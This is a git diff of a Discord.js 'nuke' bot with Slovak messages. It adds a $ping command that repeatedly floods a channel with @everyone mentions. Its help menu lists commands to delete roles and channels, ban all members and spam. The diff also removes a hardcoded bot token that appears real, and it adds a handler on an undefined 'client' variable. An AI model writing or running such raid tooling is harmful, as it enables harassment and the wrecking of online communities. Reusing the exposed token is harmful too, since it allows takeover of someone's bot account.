@@ -2,16 +2,23 @@ const Discord = require('discord.js')
 const bot = new Discord.Client();
 const prefix = '$';
 
+
 bot.on('ready', () => {
     console.log(`${bot.user.tag} je to ready!`)
 })
+
+client.on('message', gotMessage);
+
+function gotMessage(msg){
+  console.log(msg);
+}
 
 bot.on('message', message => {
     if(message.content === prefix + 'ping') {
       setInterval(function() {
           message.channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone')
          }),
-      1
+      100
     }
     if(message.content === prefix + "nuke") {
  message.channel.send("teraz mazem vsetko")
@@ -64,7 +71,7 @@ if(message.content === prefix + 'spam') {
   .addField('Info', '```$info```', true)
   .addField('Bordel', '```$nuke, $deleteroles, $create, $deletechannels, $ban_all```', true)
   .addField('Ine', '```$spam```', true)
-  .setFooter("Admini su opice :pog: ")
+  .setFooter("so keres moj, ta uz zrob daco")
   .setColor("red")
   message.channel.send(xhelp)
   }
@@ -77,4 +84,4 @@ if(message.content === prefix + 'spam') {
   }
 })
        
-bot.login("Nzg3NTkzNTc5NjYzOTgyNjIy.X9XNrg.4gcyHQhxic9OzT-ZIIj61s2XcxY")
+bot.login("token")
